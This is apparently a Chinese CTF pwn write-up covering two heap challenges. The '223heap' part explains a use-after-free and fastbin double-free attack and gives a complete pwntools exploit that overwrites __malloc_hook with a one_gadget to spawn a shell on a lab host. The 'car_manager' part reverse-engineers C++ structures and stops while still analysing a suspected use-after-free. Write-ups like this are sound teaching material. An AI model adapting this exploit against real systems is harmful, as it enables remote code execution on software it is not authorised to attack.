          <h2 id="223heap"><a href="#223heap" class="headerlink" title="223heap"></a>223heap</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.23</span><span class="number">-0u</span>buntu11<span class="number">.3</span>)</span> stable release version 2.23, by Roland McGrath et al.\n</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwn: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=<span class="number">4</span>ae938aabdee25f8227c57fc1a4ef180897687a3, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Canary，NX</li>
</ul>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (&amp;chunk2)[index] )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>((&amp;chunk2)[index]);</span><br><span class="line">  sizeg[index] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;deleted heap&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>UAF</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>程序有 UAF 漏洞，可以考虑打 fastbin attak，利用程序提供的 magic 功能可以实现 double free，从而实现任意堆块申请 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;help function for you!&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">6</span>; ++i )</span><br><span class="line">  ptr[i] = <span class="built_in">malloc</span>(<span class="number">0x38</span>uLL);</span><br><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">6</span>; ++j )</span><br><span class="line">  <span class="built_in">free</span>(ptr[j]);</span><br><span class="line"><span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ canary;</span><br></pre></td></tr></table></figure>
<p>但由于 fastbin 有 size 位的检查，因此需要错位写，将 malloc_hook 前面的指针首地址 0x7f 作为 fake chunk 的 size，从而绕过 fastbin 的检查</p>
<p>再次之前需要先通过切割 unsorted chunk 来制作一个位于 0x70 的 fast chunk 备用</p>
<p>然后可以通过 Double free 覆盖 chunk-&gt;fd 的低4位来尝试完成堆重叠（这里需要1/16的爆破，同时需要写入数据来绕过 fastbin 对 size 的检查）</p>
<p>成功劫持 malloc_hook 上方的某个地方之后，可以覆盖 malloc_hook 为 one_gadget</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./pwn1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;172.16.9.41&#x27;</span>,<span class="string">&#x27;8001&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *0x400C71 &quot;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *$rebase(0x269F)\n&quot;)</span></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;input:&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,data</span>):</span> </span><br><span class="line">    <span class="comment"># 0xff-chunk1</span></span><br><span class="line">    <span class="comment"># 0x100-chunk2</span></span><br><span class="line">    <span class="comment"># 0x101-chunk3</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;malloc :&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&quot;heap:&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span> </span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;delete:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">magic</span>():</span></span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">&quot;5555&quot;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&quot;4444&quot;</span>)</span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">&quot;5555&quot;</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x3c4b31</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">success(<span class="string">&quot;malloc_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;system &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x98</span>,p64(<span class="number">0x41</span>)*<span class="number">17</span>)</span><br><span class="line">add(<span class="number">0x120</span>,<span class="string">&quot;6666&quot;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;test&quot;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x38</span>,p64(<span class="number">0x41</span>)*<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">magic()</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">add(<span class="number">0x38</span>,p16(<span class="number">0x30c8</span>))</span><br><span class="line">add(<span class="number">0x38</span>,p64(<span class="number">0x41</span>)*<span class="number">7</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">0x38</span>,p64(<span class="number">0x41</span>)*<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">one_gedget = <span class="number">0x4527a</span>+libc_base</span><br><span class="line"><span class="comment">#one_gedget2 = 0x4527a+libc_base</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x71</span>)+p64(libc_base+<span class="number">0x3c4af5</span>-<span class="number">8</span>))</span><br><span class="line">success(<span class="string">&quot;libc_base+0x3c4af5-8 : &quot;</span>+<span class="built_in">hex</span>(libc_base+<span class="number">0x3c4af5</span>-<span class="number">8</span>))</span><br><span class="line">success(<span class="string">&quot;one_gedget &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(one_gedget))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;p&quot;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;1&quot;</span>*<span class="number">11</span>+p64(one_gedget)+p64(one_gedget))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">cmd(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="car-manager"><a href="#car-manager" class="headerlink" title="car_manager"></a>car_manager</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.9</span>)</span> stable release version 2.31.\n</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">car_manager: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">7</span>c203a4e97216a548fcfd7ab2f864bcf9e0f9e27, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>程序分析</strong></p>
<p>由于本程序的结构较为复杂，因此可以先用一个案例来试试结构：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(<span class="string">&quot;b&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">add(<span class="string">&quot;c&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">add(<span class="string">&quot;d&quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">add(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;5&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>结构体 car_list：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x5564327a9390</span><span class="number">-0x10</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x5564327a9380</span> —▸ <span class="number">0x5564327a9300</span> ◂— <span class="number">0x100000000</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x5564327a9388</span> ◂— <span class="number">0x51</span> <span class="comment">/* &#x27;Q&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x5564327a9390</span> —▸ <span class="number">0x5564327a8f30</span> —▸ <span class="number">0x5564327a8f40</span> ◂— <span class="number">0x61</span> <span class="comment">/* &#x27;a&#x27; */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x5564327a9398</span> —▸ <span class="number">0x5564327a9040</span> —▸ <span class="number">0x5564327a9050</span> ◂— <span class="number">0x62</span> <span class="comment">/* &#x27;b&#x27; */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x5564327a93a0</span> —▸ <span class="number">0x5564327a9130</span> —▸ <span class="number">0x5564327a9140</span> ◂— <span class="number">0x63</span> <span class="comment">/* &#x27;c&#x27; */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x5564327a93a8</span> —▸ <span class="number">0x5564327a9230</span> —▸ <span class="number">0x5564327a9240</span> ◂— <span class="number">0x64</span> <span class="comment">/* &#x27;d&#x27; */</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x5564327a93b0</span> —▸ <span class="number">0x5564327a9320</span> —▸ <span class="number">0x5564327a9330</span> ◂— <span class="number">0x65</span> <span class="comment">/* &#x27;e&#x27; */</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x5564327a93b8</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>car_list 用于存储 cat 结构体指针，如果超过范围就会将其释放，并重新申请更大的空间</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x5564327a8f30</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x5564327a8f30</span> —▸ <span class="number">0x5564327a8f40</span> ◂— <span class="number">0x61</span> <span class="comment">/* &#x27;a&#x27; */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x5564327a8f38</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x5564327a8f40</span> ◂— <span class="number">0x61</span> <span class="comment">/* &#x27;a&#x27; */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x5564327a8f48</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x5564327a8f50</span> —▸ <span class="number">0x5564327a8f60</span> ◂— <span class="number">0x31</span> <span class="comment">/* &#x27;1&#x27; */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x5564327a8f58</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x5564327a8f60</span> ◂— <span class="number">0x31</span> <span class="comment">/* &#x27;1&#x27; */</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x5564327a8f68</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x5564327a8f70</span> ◂— <span class="number">0x7e8</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0x5564327a8f78</span> —▸ <span class="number">0x5564327a8eb0</span> ◂— <span class="number">0x100000000</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0x5564327a8f80</span> —▸ <span class="number">0x5564327a8ed0</span> ◂— <span class="number">0x100000000</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0x5564327a8f88</span> —▸ <span class="number">0x5564327a8ef0</span> ◂— <span class="number">0x100000000</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│  <span class="number">0x5564327a8f90</span> —▸ <span class="number">0x5564327a8f10</span> ◂— <span class="number">0x100000000</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>0x5564327a8f30-0x5564327a8f48</code> 和 <code>0x5564327a8f50-0x5564327a8f68</code> 有点像 basic_string</li>
<li>后面的 <code>0x5564327a8eb0</code> 就只有两个4字节的条目</li>
</ul>
<p>可以猜测 car 结构体的条目如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> car struc ; (<span class="keyword">sizeof</span>=<span class="number">0x68</span>, mappedto_19)</span><br><span class="line"><span class="number">00000000</span> make_basic_string db <span class="number">32</span> dup(?)          ; <span class="built_in">string</span>(C)</span><br><span class="line"><span class="number">00000020</span> model_basic_string db <span class="number">32</span> dup(?)         ; <span class="built_in">string</span>(C)</span><br><span class="line"><span class="number">00000040</span> year dq ?                               ; year <span class="keyword">int</span></span><br><span class="line"><span class="number">00000048</span> tire tires ?                            ; tire tire</span><br><span class="line"><span class="number">00000068</span> car ends</span><br></pre></td></tr></table></figure>
<p>在函数 new_a_car 中可以验证：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span>::basic_string(car);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span>::basic_string(car-&gt;model_basic_string);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span>::<span class="keyword">operator</span>=(car, make);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span>::<span class="keyword">operator</span>=(car-&gt;model_basic_string, model);</span><br><span class="line">car-&gt;year = (<span class="keyword">int</span> *)year;</span><br><span class="line">car-&gt;tire.data[<span class="number">0</span>] = (struct tire)tire;</span><br><span class="line">car-&gt;tire.data[<span class="number">1</span>] = (struct tire)tire2;</span><br><span class="line">car-&gt;tire.data[<span class="number">2</span>] = (struct tire)tire3;</span><br><span class="line">car-&gt;tire.data[<span class="number">3</span>] = (struct tire)tire4;</span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<p>在释放模块中有一个疑似 UAF 的点：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">car_by_index = get_car_by_index(car_list, index);</span><br><span class="line">car = *car_by_index;</span><br><span class="line"><span class="keyword">if</span> ( *car_by_index )</span><br><span class="line">&#123;</span><br><span class="line">  free_car_internal(*car_by_index);</span><br><span class="line">  <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(car, <span class="number">0x68</span>uLL)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>delete 指针没有置空，但程序对 car_list 进行了特殊处理：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    add(<span class="built_in">str</span>(i)*<span class="number">8</span>,<span class="string">&quot;1&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">    dele(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x561b2ba0a190</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x561b2ba0a190</span> —▸ <span class="number">0x561b2ba0a110</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x561b2ba0a198</span> ◂— <span class="number">0x31</span> <span class="comment">/* &#x27;1&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x561b2ba0a1a0</span> —▸ <span class="number">0x561b2ba0a040</span> —▸ <span class="number">0x561b2ba0a050</span> ◂— <span class="string">&#x27;11111111&#x27;</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x561b2ba0a1a8</span> —▸ <span class="number">0x561b2ba0a130</span> —▸ <span class="number">0x561b2ba0a140</span> ◂— <span class="string">&#x27;22222222&#x27;</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x561b2ba0a1b0</span> —▸ <span class="number">0x561b2ba0a130</span> —▸ <span class="number">0x561b2ba0a140</span> ◂— <span class="string">&#x27;22222222&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>如果释放的 chunk 不是最后一个，其后面所有的 chunk 都会往前移动</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    add(<span class="built_in">str</span>(i)*<span class="number">8</span>,<span class="string">&quot;1&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">    dele(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
